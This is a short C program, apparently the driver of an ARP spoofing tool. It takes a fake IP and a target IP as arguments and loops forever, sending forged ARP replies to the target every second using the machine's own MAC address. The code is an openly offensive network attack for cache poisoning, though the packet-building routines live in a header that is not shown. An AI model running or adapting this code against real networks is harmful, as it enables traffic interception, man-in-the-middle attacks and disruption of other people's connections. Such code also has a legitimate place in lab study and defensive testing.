#include <unistd.h>
#include <stdio.h>
#include <stdlib.h>
#include <netinet/in.h>
#include <sys/types.h>
#include <netinet/if_ether.h>
#include "arp.h"

void main(int argc,char **argv){
	if(argc!=3){
		printf("arg number must be 2!\n");
		exit(0);
	}
	//init mac
	u_char *mac = (u_char *)malloc(ETH_ALEN);
	//init ip addr
	struct in_addr local_ip;
	//get local ip and mac
	getInfo(mac,&local_ip);
	char *fake_ip = argv[1];
	char *target_ip = argv[2];
	while(1){
		//send arp
		sendArp(mac,fake_ip,target_ip);
		sleep(1);
	}	
    free(mac);
}